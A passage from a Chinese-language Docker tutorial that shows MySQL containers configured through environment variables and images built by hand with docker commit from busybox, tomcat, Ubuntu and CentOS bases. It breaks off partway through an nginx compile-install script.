25b5c6debdaf: Pull complete 
43a5816f1617: Pull complete 
7065aaa2655f: Pull complete 
b4bc531db40f: Pull complete 
8c3e9d7c9815: Pull complete 
fadfb9734ed2: Pull complete 
Digest: sha256:e08834258fcc0efd01df358222333919df53d4a0d9b2a54da05b204b822e3b7b
Status: Downloaded newer image for mysql:5.7.32
462714bc6bbd55aca523aa9582a397aa1454767e00f7a3cd52faba18029e88fa



#mysql传递参数变量
[root@centos7 ~]# docker run --name mysql-test1 -v /data/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -e MYSQL_DATABASE=wordpress -e MYSQL_USER=wpuser -e MYSQL_PASSWORD=123456 -d -p 3306:3306 mysql:5.7.32
ba6c408ee88fa1d6afb8a39104e86e5a0d20e3bd4f53b3482045deb0aaa8a7df



#远程主机连接mysql
[root@centos8 ~]# mysql -uroot -p123456 -h10.0.0.77
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.32 MySQL Community Server (GPL)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.00 sec)

mysql> select user,host from mysql.user;
+---------------+-----------+
| user          | host      |
+---------------+-----------+
| root          | %         |
| wpuser        | %         |
| mysql.session | localhost |
| mysql.sys     | localhost |
| root          | localhost |
+---------------+-----------+
5 rows in set (0.00 sec)



#准备变量文件
[root@centos7 ~]# cat env.list
MYSQL_ROOT_PASSWORD=liusenbiao
MYSQL_DATABASE=discuz
MYSQL_USER=liu
MYSQL_PASSWORD=password



#调用变量文件
[root@centos7 ~]# docker run --name mysql-test2 --env-file=env.list -d -p 3307:3306 mysql:5.7.32
46e77c2ba2516e76bead20cc3430535dfdd38aeb4eee7c80a180f1b7f8736690
[root@centos7 ~]# docker port mysql-test2
3306/tcp -> 0.0.0.0:330
[root@centos8 ~]# mysql -uliu -ppassword -h10.0.0.77 -P3307
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.32 MySQL Community Server (GPL)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| discuz             |
+--------------------+
2 rows in set (0.00 sec)
```

### 48.6 镜像制作和管理

#### 48.6.1 Docker镜像说明

##### 48.6.1.1 容器的持续运行

```
Docker容器如果希望启动后能持续运行,就必须有一个能前台持续运行的进程，如果在容器中启动传统的服务，如:httpd,php-fpm等均为后台进程模式运行,就导致docker在前台没有运行的应用,这样的容器启动后会立即退出。所以一般会将服务程序以前台方式运行，对于有一些可能不知道怎么实现前台运行的程序,只需要在你启动的该程序之后添加类似于 tail ，top 这种可以前台运行的程序即可. 比较常用的方法，如 tail -f /etc/hosts。
```

**范例:** 

```
#httpd
ENTRYPOINT [ "/usr/sbin/apache2" ]  
CMD ["-D", "FOREGROUND"]  


#nginx
ENTRYPOINT [ "/usr/sbin/nginx", "-g", "daemon off;" ]  


#用脚本运行容器
cat run_haproxy.sh 
#!/bin/bash
haproxy -f /etc/haproxy/haproxy.cfg
tail -f /etc/hosts
tail -n1 Dockerfile 
CMD ["run_haproxy.sh"]
```

##### 48.6.1.2 docker镜像生命周期

![1659532377202](linux体系.assets/1659532377202.png)

##### 48.6.1.3 制作镜像方式

```
#概述
Docker 镜像制作类似于虚拟机的镜像（模版）制作，即按照公司的实际业务需求将需要安装的软件、相关配置等基础环境配置完成，然后将其做成镜像，最后再批量从镜像批量生成容器实例，这样可以极大的简化相同环境的部署工作。
Docker的镜像制作分为手动制作（基于容器）和自动制作(基于DockerFile)，企业通常都是基于Dockerfile制作镜像。


#制作镜像方式
docker commit #通过修改现有容器,将之手动构建为镜像
docker build  #通过Dockerfile文件,批量构建为镜像
```

#### 48.6.2 手动构建镜像(了解)

##### 48.6.2.1 基于容器手动制作镜像步骤

**docker commit 格式**

```
docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]

#选项
-a, --author string   Author (e.g., "John Hannibal Smith <hannibal@a-team.com>")
-c, --change list     Apply Dockerfile instruction to the created image
-m, --message string   Commit message
-p, --pause           Pause container during commit (default true)


#说明:
制作镜像和CONTAINER状态无关,停止状态也可以制作镜像
如果没有指定[REPOSITORY[:TAG]],REPOSITORY和TAG都为<none>
提交的时候标记TAG号: 生产当中常用，后期可以根据TAG标记创建不同版本的镜像以及创建不同版本的容器
```

**基于容器手动制作镜像步骤具体如下:**

```
1. 下载一个系统的官方基础镜像，如: CentOS 或 Ubuntu 
2. 基于基础镜像启动一个容器,并进入到容器 
3. 在容器里面做配置操作
  3.1）安装基础命令
  3.2）配置运行环境
  3.3）安装服务和配置服务
  3.4）放业务程序代码
4. 提交为一个新镜像 docker commit
5. 基于自己的的镜像创建容器并测试访问
```

##### 48.6.2.2 基于busybox制作httpd镜像

```
[root@ubuntu1804 ~]#docker run -it --name b1 busybox 
/ # ls
bin   dev   etc   home proc root sys   tmp   usr   var
/ # mkdir /data/html -p
/ # echo liusenbiao website in busybox > /data/html/index.html
/ # httpd --help
BusyBox v1.34.1 (2021-12-29 21:12:15 UTC) multi-call binary.

Usage: httpd [-ifv[v]] [-c CONFFILE] [-p [IP:]PORT] [-u USER[:GRP]] [-r REALM] [-h HOME]
or httpd -d/-e/-m STRING

Listen for incoming HTTP requests

	-i		Inetd mode
	-f		Don't daemonize
	-v[v]		Verbose
	-p [IP:]PORT	Bind to IP:PORT (default *:80)
	-u USER[:GRP]	Set uid/gid after binding to port
	-r REALM	Authentication Realm for Basic Authentication
	-h HOME		Home directory (default .)
	-c FILE		Configuration file (default {/etc,HOME}/httpd.conf)
	-m STRING	MD5 crypt STRING
	-e STRING	HTML encode STRING
	-d STRING	URL decode STRING

/ # exit


#手动制作镜像格式1
[root@centos7 ~]# docker commit -a "liu<root@liusenbiao.com>" -c 'CMD /bin/httpd -fv -h /data/html' -c "EXPOSE 80" b1 httpd-busybox:v1.0
sha256:9598c568888c03b40a1c02261b3e98b47df54cdb66c673f276edaecd088fa8b3


#手动制作镜像格式2
[root@centos7 ~]#docker commit -a "liu<root@liusenbiao.com>" -c 'CMD ["/bin/httpd", "-f", "-v","-h", "/data/html"]' -c "EXPOSE 80" b1 httpd-busybox:v1.0



#查看制作的镜像
[root@centos7 ~]# docker images
REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE
httpd-busybox           v1.0                9598c568888c        4 minutes ago       1.24MB
busybox                 latest              beae173ccac6        7 months ago        1.24MB
nginx                   latest              605c77e624dd        7 months ago        141MB
redis                   latest              7614ae9453d1        7 months ago        113MB
httpd                   latest              dabbfbe0c57b        7 months ago        144MB
alpine                  latest              c059bfaa849c        8 months ago        5.59MB
centos                  latest              5d0da3dc9764        10 months ago       231MB
mysql                   5.7.32              cc8775c0fe94        18 months ago       449MB
docs/docker.github.io   latest              32ed84d97e30        2 years ago         1GB



#镜像后台运行
[root@centos7 ~]# docker run -d -P --name web1 httpd-busybox:v1.0
d129ca48297ed54e384904e1e46d7488f25889e5b2512e7615c31be0e0ccdac1
[root@centos7 ~]# docker port web1
80/tcp -> 0.0.0.0:32768



#再次制作镜像v2.0版
#没有指定前台运行的进程，容器一启动就会退出
[root@centos7 ~]# docker commit -a "liu<root@liusenbiao.com>" b1 httpd-busybox:v2.0
sha256:ff1c4d6b6b368384fc5f350e4a3b27a0c7901346e37d518192103be50088ba0a



#查看制作的v2.0版镜像
[root@centos7 ~]# docker images
REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE
httpd-busybox           v2.0                ff1c4d6b6b36        43 seconds ago      1.24MB
httpd-busybox           v1.0                9598c568888c        19 minutes ago      1.24MB
busybox                 latest              beae173ccac6        7 months ago        1.24MB
nginx                   latest              605c77e624dd        7 months ago        141MB
redis                   latest              7614ae9453d1        7 months ago        113MB
httpd                   latest              dabbfbe0c57b        7 months ago        144MB
alpine                  latest              c059bfaa849c        8 months ago        5.59MB
centos                  latest              5d0da3dc9764        10 months ago       231MB
mysql                   5.7.32              cc8775c0fe94        18 months ago       449MB
docs/docker.github.io   latest              32ed84d97e30        2 years ago         1GB
```

![1659609783533](linux体系.assets/1659609783533.png)

##### 48.6.2.3 手动制作tomcat镜像

```
[root@centos7 ~]# docker run -d -p 8080:8080 tomcat
Unable to find image 'tomcat:latest' locally
latest: Pulling from library/tomcat
0e29546d541c: Pull complete 
9b829c73b52b: Pull complete 
cb5b7ae36172: Pull complete 
6494e4811622: Pull complete 
668f6fcc5fa5: Pull complete 
dc120c3e0290: Pull complete 
8f7c0eebb7b1: Pull complete 
77b694f83996: Pull complete 
0f611256ec3a: Pull complete 
4f25def12f23: Pull complete 
Digest: sha256:9dee185c3b161cdfede1f5e35e8b56ebc9de88ed3a79526939701f3537a52324
Status: Downloaded newer image for tomcat:latest
8c33e62eaf61f3a9c6995aa91ea11959c891540ec7a3ded0475a860ddfa51b20



[root@centos7 ~]# ss -ntl
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      128           *:22                        *:*                  
LISTEN     0      100    127.0.0.1:25                        *:*                  
LISTEN     0      128        [::]:22                     [::]:*                  
LISTEN     0      100       [::1]:25                     [::]:*                  
LISTEN     0      128        [::]:6666                   [::]:*                  
LISTEN     0      128        [::]:8080                   [::]:* 


[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED              STATUS              PORTS                    NAMES
8c33e62eaf61        tomcat              "catalina.sh run"   About a minute ago   Up About a minute   0.0.0.0:8080->8080/tcp   eager_khayyam



#修改容器
#默认镜像访问不了web页面
[root@centos7 ~]# docker exec -it 8c33e62eaf61 bash
root@8c33e62eaf61:/usr/local/tomcat# ls webapps.dist/
ROOT  docs  examples  host-manager  manager
root@8c33e62eaf61:/usr/local/tomcat# cp -a webapps.dist/* webapps/
root@8c33e62eaf61:/usr/local/tomcat# exit
exit



#提交新镜像
[root@centos7 ~]# docker commit -m "add webapps app" -a "liusenbiao" 8c33e62eaf61 tomcat:10.0.14-v1
sha256:e3e29ddcc7c39f0aa0e5c0ab2a8e9a9437763bce9735450f5917aa9c1aab2c84



#查看制作的镜像
[root@centos7 ~]# docker images
REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE
tomcat                  10.0.14-v1          e3e29ddcc7c3        47 seconds ago      684MB
httpd-busybox           v2.0                ff1c4d6b6b36        29 minutes ago      1.24MB
httpd-busybox           v1.0                9598c568888c        47 minutes ago      1.24MB
busybox                 latest              beae173ccac6        7 months ago        1.24MB
nginx                   latest              605c77e624dd        7 months ago        141MB
tomcat                  latest              fb5657adc892        7 months ago        680MB
redis                   latest              7614ae9453d1        7 months ago        113MB
httpd                   latest              dabbfbe0c57b        7 months ago        144MB
alpine                  latest              c059bfaa849c        8 months ago        5.59MB
centos                  latest              5d0da3dc9764        10 months ago       231MB
mysql                   5.7.32              cc8775c0fe94        18 months ago       449MB
docs/docker.github.io   latest              32ed84d97e30        2 years ago         1GB




#利用新镜像启动容器
[root@centos7 ~]# docker run -d --name tomcat1 -P tomcat:10.0.14-v1
3b7ebabc33227743dc032494b51a44480bc1f0dd346a2b3443f8c5ee566ccb2d
[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                     NAMES
3b7ebabc3322        tomcat:10.0.14-v1   "catalina.sh run"   12 seconds ago      Up 12 seconds       0.0.0.0:32769->8080/tcp   tomcat1
8c33e62eaf61        tomcat              "catalina.sh run"   15 minutes ago      Up 15 minutes       0.0.0.0:8080->8080/tcp    eager_khayyam

```

**修改web页面的镜像**

![1659611387368](linux体系.assets/1659611387368.png)

**访问tomcat1:32769**

![1659612121347](linux体系.assets/1659612121347.png)

##### 48.6.2.4 基于Ubuntu制作nginx的镜像

```
#拉取ubuntu镜像
[root@centos7 ~]# docker pull ubuntu
Using default tag: latest
latest: Pulling from library/ubuntu
7b1a6ab2e44d: Pull complete 
Digest: sha256:626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322
Status: Downloaded newer image for ubuntu:latest
docker.io/library/ubuntu:latest


#ubuntu容器里安装nginx
[root@centos7 ~]# docker run -it -p 80 --name nginx_ubuntu ubuntu bash
root@1f28c704178c:/# cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.3 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.3 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
#配置ubuntu的epel源
root@1f28c704178c:/# cat > /etc/apt/sources.list
deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse

deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse

root@1f28c704178c:/# apt update
Get:1 http://mirrors.aliyun.com/ubuntu focal InRelease [265 kB]
Get:2 http://mirrors.aliyun.com/ubuntu focal-security InRelease [114 kB]
Get:3 http://mirrors.aliyun.com/ubuntu focal-updates InRelease [114 kB]
...
root@1f28c704178c:/# apt install nginx -y
...
Please select the geographic area in which you live. Subsequent configuration questions will narrow this down by presenting a list of cities, representing the time zones in
which they are located.

  1. Africa  2. America  3. Antarctica  4. Australia  5. Arctic  6. Asia  7. Atlantic  8. Europe  9. Indian  10. Pacific  11. SystemV  12. US  13. Etc
Geographic area: 6    #填写此行

Please select the city or region corresponding to your time zone.

  1. Aden      10. Bahrain     19. Chongqing  28. Harbin       37. Jerusalem    46. Kuala_Lumpur  55. Novokuznetsk  64. Qyzylorda      73. Taipei         82. Ulaanbaatar
  2. Almaty    11. Baku        20. Colombo    29. Hebron       38. Kabul        47. Kuching       56. Novosibirsk   65. Rangoon        74. Tashkent       83. Urumqi
  3. Amman     12. Bangkok     21. Damascus   30. Ho_Chi_Minh  39. Kamchatka    48. Kuwait        57. Omsk          66. Riyadh         75. Tbilisi        84. Ust-Nera
  4. Anadyr    13. Barnaul     22. Dhaka      31. Hong_Kong    40. Karachi      49. Macau         58. Oral          67. Sakhalin       76. Tehran         85. Vientiane
  5. Aqtau     14. Beirut      23. Dili       32. Hovd         41. Kashgar      50. Magadan       59. Phnom_Penh    68. Samarkand      77. Tel_Aviv       86. Vladivostok
  6. Aqtobe    15. Bishkek     24. Dubai      33. Irkutsk      42. Kathmandu    51. Makassar      60. Pontianak     69. Seoul          78. Thimphu        87. Yakutsk
  7. Ashgabat  16. Brunei      25. Dushanbe   34. Istanbul     43. Khandyga     52. Manila        61. Pyongyang     70. Shanghai       79. Tokyo          88. Yangon
  8. Atyrau    17. Chita       26. Famagusta  35. Jakarta      44. Kolkata      53. Muscat        62. Qatar         71. Singapore      80. Tomsk          89. Yekaterinburg
  9. Baghdad   18. Choibalsan  27. Gaza       36. Jayapura     45. Krasnoyarsk  54. Nicosia       63. Qostanay      72. Srednekolymsk  81. Ujung_Pandang  90. Yerevan
  
Time zone: 70   #填写此行
...
root@1f28c704178c:/# ls -l /etc/localtime 
lrwxrwxrwx 1 root root 33 Aug  5 04:13 /etc/localtime -> /usr/share/zoneinfo/Asia/Shanghai
root@1f28c704178c:/# nginx -v
nginx version: nginx/1.18.0 (Ubuntu)
root@1f28c704178c:/# echo Nginx Website in Docker > /var/www/html/index.html
root@1f28c704178c:/# exit
exit



#提交为镜像
[root@centos7 ~]# docker commit -a 'liusenbiao' -m 'nginx-ubuntu:20.04' nginx_ubuntu nginx_ubuntu20.04:v1.18.0
sha256:d2e39df63826ba949a9d3ad07c4eb0237fe2364cf353266966e609d3ad65e044



#查看镜像
[root@centos7 ~]# docker images
REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE
nginx_ubuntu20.04       v1.18.0             d2e39df63826        20 seconds ago      196MB
tomcat                  10.0.14-v1          e3e29ddcc7c3        About an hour ago   684MB
httpd-busybox           v2.0                ff1c4d6b6b36        2 hours ago         1.24MB
httpd-busybox           v1.0                9598c568888c        2 hours ago         1.24MB
busybox                 latest              beae173ccac6        7 months ago        1.24MB
nginx                   latest              605c77e624dd        7 months ago        141MB
tomcat                  latest              fb5657adc892        7 months ago        680MB
redis                   latest              7614ae9453d1        7 months ago        113MB
httpd                   latest              dabbfbe0c57b        7 months ago        144MB
alpine                  latest              c059bfaa849c        8 months ago        5.59MB
ubuntu                  latest              ba6acccedd29        9 months ago        72.8MB
centos                  latest              5d0da3dc9764        10 months ago       231MB
mysql                   5.7.32              cc8775c0fe94        18 months ago       449MB
docs/docker.github.io   latest              32ed84d97e30        2 years ago         1GB




#从制作的新镜像启动容器并测试访问
[root@centos7 ~]# docker run -d -p 80 --name nginx-web2 nginx_ubuntu20.04:v1.18.0 nginx -g 'daemon off;'
910549b8bdaf37a7de49e2732991b9b32d5994e21f3677afbd4cc133ee29772e


[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE                       COMMAND                  CREATED             STATUS              PORTS                     NAMES
910549b8bdaf        nginx_ubuntu20.04:v1.18.0   "nginx -g 'daemon of…"   35 seconds ago      Up 34 seconds       0.0.0.0:32771->80/tcp     nginx-web2
3b7ebabc3322        tomcat:10.0.14-v1           "catalina.sh run"        About an hour ago   Up About an hour    0.0.0.0:32769->8080/tcp   tomcat1
8c33e62eaf61        tomcat                      "catalina.sh run"        About an hour ago   Up About an hour    0.0.0.0:8080->8080/tcp    eager_khayyam
```

![1659616199586](linux体系.assets/1659616199586.png)

##### 48.6.2.5 基于CentOS的镜像制作nginx镜像

```
#查看镜像
[root@centos7 ~]# docker images
REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE
nginx_ubuntu20.04       v1.18.0             d2e39df63826        20 seconds ago      196MB
tomcat                  10.0.14-v1          e3e29ddcc7c3        About an hour ago   684MB
httpd-busybox           v2.0                ff1c4d6b6b36        2 hours ago         1.24MB
httpd-busybox           v1.0                9598c568888c        2 hours ago         1.24MB
busybox                 latest              beae173ccac6        7 months ago        1.24MB
nginx                   latest              605c77e624dd        7 months ago        141MB
tomcat                  latest              fb5657adc892        7 months ago        680MB
redis                   latest              7614ae9453d1        7 months ago        113MB
httpd                   latest              dabbfbe0c57b        7 months ago        144MB
alpine                  latest              c059bfaa849c        8 months ago        5.59MB
ubuntu                  latest              ba6acccedd29        9 months ago        72.8MB
centos                  latest              5d0da3dc9764        10 months ago       231MB
mysql                   5.7.32              cc8775c0fe94        18 months ago       449MB
docs/docker.github.io   latest              32ed84d97e30        2 years ago         1GB




#修改时区
[root@centos7 ~]# docker run -it --name centos1 centos bash
[root@6cded96bb384 /]# cat /etc/redhat-release 
CentOS Linux release 8.4.2105
[root@6cded96bb384 /]# rm -f /etc/localtime
[root@6cded96bb384 /]# ln -s /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
[root@6cded96bb384 /]# date
Fri Aug  5 20:37:36 CST 2022


#更改yum源
[root@6cded96bb384 /]# cd /etc/yum.repos.d
[root@e2dc8f46535b yum.repos.d]# rm -rf *
[root@e2dc8f46535b yum.repos.d]# vi base.repo 
# CentOS-Base.repo
#
# The mirror system uses the connecting IP address of the client and the
# update status of each mirror to pick mirrors that are updated to and
# geographically close to the client.  You should use this for CentOS updates
# unless you are manually picking other mirrors.
#
# If the mirrorlist= does not work for you, as a fall back you can try the 
# remarked out baseurl= line instead.
#
#
 
[base]
name=CentOS-$releasever - Base - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/BaseOS/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/BaseOS/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/BaseOS/$basearch/os/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official
 
#additional packages that may be useful
[extras]
name=CentOS-$releasever - Extras - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/extras/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/extras/$basearch/os/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official
 
#additional packages that extend functionality of existing packages
[centosplus]
name=CentOS-$releasever - Plus - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/centosplus/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/centosplus/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/centosplus/$basearch/os/
gpgcheck=1
enabled=0
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official
 
[PowerTools]
name=CentOS-$releasever - PowerTools - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/PowerTools/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/PowerTools/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/PowerTools/$basearch/os/
gpgcheck=1
enabled=0
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official


[AppStream]
name=CentOS-$releasever - AppStream - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/AppStream/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/AppStream/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/AppStream/$basearch/os/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official
[root@e2dc8f46535b yum.repos.d]# yum -y install nginx wget vim net-tools
[root@e2dc8f46535b yum.repos.d]# yum clean all
Failed to set locale, defaulting to C.UTF-8
18 files removed


#设置nginx前台执行
[root@e2dc8f46535b yum.repos.d]# vim /etc/nginx/nginx.conf
user nginx;
worker_processes auto;
error_log /var/log/nginx/error.log;
pid /run/nginx.pid;
daemon off;   #nginx前台执行


#自定义web页面
[root@e2dc8f46535b yum.repos.d]# echo "liusenbiao's Nginx Page in Docker" > /usr/share/nginx/html/index.html


#提交为镜像
[root@centos7 ~]# docker commit -a "root@liusenbiao.com" -m "nginx yum v1" -c "EXPOSE 80 443" centos1 liu/centos7-nginx:1.14.1.v1
sha256:f239712db2b30f1bbea0adb355bdd8ce85d368b69df23db6910cd7cd0e019cdb



#查看镜像
[root@centos7 ~]# docker images
REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE
liu/centos7-nginx       1.14.1.v1           f239712db2b3        21 seconds ago      344MB
nginx_ubuntu20.04       v1.18.0             d2e39df63826        About an hour ago   196MB
tomcat                  10.0.14-v1          e3e29ddcc7c3        2 hours ago         684MB
httpd-busybox           v2.0                ff1c4d6b6b36        3 hours ago         1.24MB
httpd-busybox           v1.0                9598c568888c        3 hours ago         1.24MB
busybox                 latest              beae173ccac6        7 months ago        1.24MB
nginx                   latest              605c77e624dd        7 months ago        141MB
tomcat                  latest              fb5657adc892        7 months ago        680MB
redis                   latest              7614ae9453d1        7 months ago        113MB
httpd                   latest              dabbfbe0c57b        7 months ago        144MB
alpine                  latest              c059bfaa849c        8 months ago        5.59MB
ubuntu                  latest              ba6acccedd29        9 months ago        72.8MB
centos                  latest              5d0da3dc9764        10 months ago       231MB
mysql                   5.7.32              cc8775c0fe94        18 months ago       449MB
docs/docker.github.io   latest              32ed84d97e30        2 years ago         1GB



#指定前台运行
[root@centos7 ~]# docker run -d -P --name nginx01 liu/centos7-nginx:1.14.1.v1 nginx
01e501c618c82e690e7a5703f65d3841a12584eb055eabb9ce67cd603c178bd6

[root@centos7 ~]# docker ps -l
CONTAINER ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS                                           NAMES
01e501c618c8        liu/centos7-nginx:1.14.1.v1   "nginx"             39 seconds ago      Up 38 seconds       0.0.0.0:32773->80/tcp, 0.0.0.0:32772->443/tcp   nginx01

[root@centos7 ~]# docker port nginx01
443/tcp -> 0.0.0.0:32772
80/tcp -> 0.0.0.0:32773
```

![1659620023804](linux体系.assets/1659620023804.png)

##### 48.6.2.6 基于CentOS镜像编译安装nginx镜像

```
#下载镜像并初始化系统
[root@centos7 ~]# docker run -it centos bash
[root@90ae6f81a816 /]# cd /etc/yum.repos.d/
[root@90ae6f81a816 yum.repos.d]# ls
CentOS-Linux-AppStream.repo	     CentOS-Linux-Debuginfo.repo  CentOS-Linux-FastTrack.repo	      CentOS-Linux-Plus.repo
CentOS-Linux-BaseOS.repo	     CentOS-Linux-Devel.repo	  CentOS-Linux-HighAvailability.repo  CentOS-Linux-PowerTools.repo
CentOS-Linux-ContinuousRelease.repo  CentOS-Linux-Extras.repo	  CentOS-Linux-Media.repo	      CentOS-Linux-Sources.repo
[root@90ae6f81a816 yum.repos.d]# rm -rf *

#配yum源
[root@90ae6f81a816 yum.repos.d]# vi base.repo
[base]
name=CentOS-$releasever - Base - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/BaseOS/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/BaseOS/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/BaseOS/$basearch/os/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official
 
#additional packages that may be useful
[extras]
name=CentOS-$releasever - Extras - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/extras/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/extras/$basearch/os/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official
 
#additional packages that extend functionality of existing packages
[centosplus]
name=CentOS-$releasever - Plus - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/centosplus/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/centosplus/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/centosplus/$basearch/os/
gpgcheck=1
enabled=0
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official
 
[PowerTools]
name=CentOS-$releasever - PowerTools - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/PowerTools/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/PowerTools/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/PowerTools/$basearch/os/
gpgcheck=1
enabled=0
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official


[AppStream]
name=CentOS-$releasever - AppStream - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/AppStream/$basearch/os/
        http://mirrors.aliyuncs.com/centos/$releasever/AppStream/$basearch/os/
        http://mirrors.cloud.aliyuncs.com/centos/$releasever/AppStream/$basearch/os/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official



#在容器上跑编译安装nginx的脚本
[root@90ae6f81a816 ~]# vim install_nginx.sh
#!/bin/bash
#
#********************************************************************
#Author:			liusenbiao
#Date: 				2022-06-21
#FileName：			install_nginx.sh
#URL: 				http://www.liusenbiao.com
#Description：		The test script
#********************************************************************
SRC_DIR=/usr/local/src
NGINX_URL=http://nginx.org/download/
NGINX_FILE=nginx-1.18.0
TAR=.tar.gz
NGINX_INSTALL_DIR=/apps/nginx
CPUS=`lscpu |awk '/^CPU\(s\)/{print $2}'`

color () {
    RES_COL=60
    MOVE_TO_COL="echo -en \\033[${RES_COL}G"
    SETCOLOR_SUCCESS="echo -en \\033[1;32m"
    SETCOLOR_FAILURE="echo -en \\033[1;31m"
    SETCOLOR_WARNING="echo -en \\033[1;33m"
    SETCOLOR_NORMAL="echo -en \E[0m"
    echo -n "$1" && $MOVE_TO_COL
    echo -n "["
    if [ $2 = "success" -o $2 = "0" ] ;then
        ${SETCOLOR_SUCCESS}
        echo -n $"  OK  "    
    elif [ $2 = "failure" -o $2 = "1"  ] ;then 
        ${SETCOLOR_FAILURE}
        echo -n $"FAILED"
    else
        ${SETCOLOR_WARNING}
        echo -n $"WARNING"
    fi
    ${SETCOLOR_NORMAL}
    echo -n "]"
    echo 
}

os_type () {
   awk -F'[ "]' '/^NAME/{print $2}' /etc/os-release
}

os_version () {
